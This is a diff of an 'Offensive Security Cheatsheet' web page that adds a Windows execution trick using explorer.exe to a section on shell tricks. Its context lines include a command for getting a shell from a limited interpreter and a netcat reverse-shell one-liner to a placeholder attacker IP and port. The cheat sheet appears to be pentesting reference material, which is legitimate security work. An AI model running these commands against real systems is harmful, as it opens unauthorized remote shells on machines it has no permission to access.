@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-06-16T13:58:58 CEST">
+<meta name="revised" content="2020-06-19T18:30:32 CEST">
 <title>Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1745,6 +1745,10 @@ https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalati
 
 <span style="color:#75715e"># Getting shell in limited interpreter</span>
 system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;start cmd.exe /k </span><span style="color:#111">$cmd</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">)</span>
+
+<span style="color:#75715e"># Alternative execution (eq &#39;cmd.exe /c&#39;)</span>
+https://twitter.com/CyberRaiju/status/1273597319322058752?s<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+explorer.exe /root 
 
 <span style="color:#75715e"># Reverse shell</span>
 nc.exe attacker_ip attacker_port -e cmd.exe
